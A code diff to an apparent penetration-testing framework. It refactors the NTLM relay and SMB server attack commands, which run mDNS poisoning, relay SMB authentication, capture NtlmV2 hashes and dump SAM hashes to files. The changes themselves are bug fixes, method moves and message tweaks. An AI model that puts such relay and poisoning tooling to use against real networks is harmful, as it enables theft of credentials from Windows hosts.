@@ -71,7 +71,6 @@ class SmbServerAttack(CommandSet):
     def __async_options(self):
         sys.stdout = open("/dev/null", "w")
         self.__mdns_poisoner.logger_level = "DEBUG"
-
         signal.signal(signal.SIGINT, signal.SIG_IGN)
 
     def __display_ntlmv2(self):
@@ -113,7 +112,7 @@ class SmbServerAttack(CommandSet):
         self.__attack = Process(target=self.__launch_necessary_components, args=(args,))
         self.__attack.start()
         self._cmd.info_logger.info(
-            f"Running mss the results will be saved in : {self.__path_file} "
+            f"Running mss the results will be saved in : {self.__path_file}"
         )
 
         if not args.Asynchronous:
@@ -246,22 +245,6 @@ class NtlmRelay(CommandSet):
         self.__clients = {"SMB": SMBRelayClient}
         self.__config = None
 
-    @property
-    def mdns_poisoner(self) -> MDNS:
-        return self.__mdns_poisoner
-
-    @property
-    def smb_relay_server(self) -> SmbRelayServer:
-        return self.__smb_relay_server
-
-    @mdns_poisoner.setter
-    def mdns_poisoner(self, poisoner: MDNS) -> None:
-        self.__mdns_poisoner = poisoner
-
-    @smb_relay_server.setter
-    def ntlm_relay_attack(self, attack: SmbRelayServer) -> None:
-        self.__smb_relay_server = attack
-
     def __define_alerts(self):
         self.__alerts_dictionary["sam_dump"] = 0
         self.__alerts_dictionary["new_connection"] = 0
@@ -289,10 +272,10 @@ class NtlmRelay(CommandSet):
         if self.__alerts_dictionary["new_connection"] == 1:
             if self._cmd.terminal_lock.acquire(blocking=False):
                 self._cmd.async_alert(
-                    f"{LogSymbols.INFO.value} New connection! Use show_connections to see it "
+                    f"{LogSymbols.INFO.value} New connection captured! Use show_connections(-SC) to see it "
                 )
                 self._cmd.info_logger.debug(
-                    f"{LogSymbols.INFO.value} New connection! Use show_connections to see it "
+                    f"{LogSymbols.INFO.value} New connection captured! Use show_connections(-SC) to see it "
                 )
                 self._cmd.terminal_lock.release()
 
@@ -324,13 +307,13 @@ class NtlmRelay(CommandSet):
             sys.stdout = open("/dev/null", "w")
 
         if args.proxy:
-            proxy_server = Proxy()
+            proxy_server = Proxy(self._cmd.info_logger)
             sock_server = proxy_server.server
             self.__config.setRunSocks(True, sock_server)
 
         if args.Asynchronous:
             self.__mdns_poisoner.logger_level = "DEBUG"
-            signal.signal(signal.SIGINT, signal.SIGINT)
+            signal.signal(signal.SIGINT, signal.SIG_IGN)
         mdns_thread = Thread(target=self.__mdns_poisoner.start_mdns_poisoning)
         mdns_thread.daemon = True
 
@@ -383,14 +366,17 @@ class NtlmRelay(CommandSet):
                 pass
 
     def __file_exits(self) -> bool:
-        exit = False
-        if os.path.exists(f"{self.__ouput_sam_dir}/{self.__output_sam_file}"):
+        exit = True
+        if os.path.exists(self.__output_sam_dir + "/" + self.__output_sam_file):
             self._cmd.error_logger.warning(
-                "The file will be overwrite, do you want to continue ?(y)"
+                "The file will be overwrite, do you want to continue ?(press 'y' to continue but any)"
             )
             output = input()
-            if output != "y" or output != "yes":
-                exit = True
+            if output == "y" or output == "yes":
+                exit = False
+        else:
+            exit = False
+
         return exit
 
     def __check_directory(self) -> bool:
@@ -398,23 +384,7 @@ class NtlmRelay(CommandSet):
             self.__output_sam_dir, os.X_OK | os.W_OK
         )  # Executing and wirte
 
-    def __checking_conditions_for_attack(self, args: argparse.Namespace) -> bool:
-        if args.show_connections:
-            self.__show_connections()
-        if args.output_sam != ".":
-            self.__output_sam_dir = args.output_sam
-        else:
-            self.__output_sam_dir = os.getcwd()
-
-        self.__output_sam_file = f"{self._cmd.RHOST}_samhashes.sam"
-
-        exit_value = self.__file_exits()
-        if exit_value:
-            self._cmd.info_logger.info("Exiting ...")
-            return False
-
-        self.__configure_alert_thread()
-
+    def __checking_ending_options(self, args: argparse.Namespace):
         if args.end_attack:
             self.__ends_ntlm_relay()
             return False
@@ -423,6 +393,28 @@ class NtlmRelay(CommandSet):
                 "The attacks is already running in the background "
             )
             return False
+        return True
+
+    def __checking_conditions_for_attack(self, args: argparse.Namespace) -> bool:
+
+        if args.show_connections:
+            self.__show_connections()
+            return False
+        if not self.__checking_ending_options(args):
+            return False
+
+        self.__output_sam_file = f"{self._cmd.RHOST}_samhashes.sam"
+
+        if args.output_sam != os.getcwd():
+            self.__output_sam_dir = args.output_sam
+
+        exit_value = self.__file_exits()
+        if exit_value:
+            self._cmd.info_logger.info("Exiting ...")
+            return False
+
+        self.__configure_alert_thread()
+
         return True
 
     def __creating_components(self, args: argparse.Namespace) -> None:
@@ -465,7 +457,36 @@ class NtlmRelay(CommandSet):
             except RequestException:
                 self._cmd.error_logger.error("Error while trying to connect")
         else:
-            self._cmd.error_logger("The ntlm_relay process is not activated")
+            self._cmd.error_logger.error("The ntlm_relay process is not activated")
+
+    def __ends_ntlm_relay(self) -> None:
+        if self.__ntlm_relay_process is not None and self.__ntlm_relay_process.is_alive:
+            self._cmd.info_logger.success(
+                "Finishing ntlm relay attack in the background ..."
+            )
+            self.__ntlm_relay_process.terminate()
+            self.__ntlm_relay_process.join()
+            self.__ntlm_relay_process = None
+            if self.__alerts_hunter.is_alive():
+                self._cmd.info_logger.debug("Finishing alerts thread ...")
+                self.__alerts_dictionary["stop"] = 1
+                self.__alerts_hunter.join()
+                self.__alerts_dictionary["stop"] = 0
+
+        else:
+            self._cmd.error_logger.error(
+                "There is not ntlm_relay process in the background"
+            )
+
+    def ntlm_relay_postloop(self) -> None:
+        if self.__ntlm_relay_process is not None and self.__ntlm_relay_process.is_alive:
+            self._cmd.info_logger.debug("Finishing ntlm_relay process ...")
+            self.__ntlm_relay_process.terminate()
+            self.__ntlm_relay_process.join()
+        if self.__alerts_hunter is not None and self.__alerts_hunter.is_alive():
+            self.__alerts_dictionary["stop"] = 1
+            self._cmd.info_logger.debug("Finishing alerts thread ...")
+            self.__alerts_hunter.join()
 
     argParser = Cmd2ArgumentParser(
         description="""Command to perform ntlm relay attack"""
@@ -537,32 +558,3 @@ class NtlmRelay(CommandSet):
             self._cmd.show_settable_variables_necessary(settable_variables_required)
         elif self._cmd.check_settable_variables_value(settable_variables_required):
             self.__launching_attack(args)
-
-    def __ends_ntlm_relay(self) -> None:
-        if self.__ntlm_relay_process is not None and self.__ntlm_relay_process.is_alive:
-            self._cmd.info_logger.success(
-                "Finishing ntlm relay attack in the background ..."
-            )
-            self.__ntlm_relay_process.terminate()
-            self.__ntlm_relay_process.join()
-            self.__ntlm_relay_process = None
-            if self.__alerts_hunter.is_alive():
-                self._cmd.info_logger.debug("Finishing alerts thread ...")
-                self.__alerts_dictionary["stop"] = 1
-                self.__alerts_hunter.join()
-                self.__alerts_dictionary["stop"] = 0
-
-        else:
-            self._cmd.error_logger.error(
-                "There is not ntlm_relay process in the background"
-            )
-
-    def ntlm_relay_postloop(self) -> None:
-        if self.__ntlm_relay_process is not None and self.__ntlm_relay_process.is_alive:
-            self._cmd.info_logger.debug("Finishing ntlm_relay process ...")
-            self.__ntlm_relay_process.terminate()
-            self.__ntlm_relay_process.join()
-        if self.__alerts_hunter is not None and self.__alerts_hunter.is_alive():
-            self.__alerts_dictionary["stop"] = 1
-            self._cmd.info_logger.debug("Finishing alerts thread ...")
-            self.__alerts_hunter.join()
